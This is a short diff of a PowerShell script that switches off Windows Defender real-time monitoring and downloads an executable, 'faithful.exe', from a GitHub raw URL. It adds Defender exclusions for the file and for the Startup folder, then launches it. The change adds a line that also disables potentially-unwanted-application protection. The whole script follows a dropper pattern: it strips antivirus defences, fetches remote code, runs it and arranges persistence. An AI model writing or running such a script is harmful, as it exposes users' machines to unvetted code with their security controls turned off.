@@ -6,7 +6,8 @@ cd $env:userprofile
 Set-MpPreference -DisableRealtimeMonitoring $true
 Write-Output "Starting script..."
 Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/faithful.exe -OutFile "faithful.exe"
-Write-Output "Adding Windows Defender exclusion..."
+Write-Output "Adding Windows Defender exclusions..."
+Set-MpPreference -PUAProtection Disabled
 Add-MpPreference -ExclusionPath "$((Get-Item .).FullName)\faithful.exe"
 Add-MpPreference -ExclusionPath "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\faithful.exe"
 Start-Process ("faithful.exe")
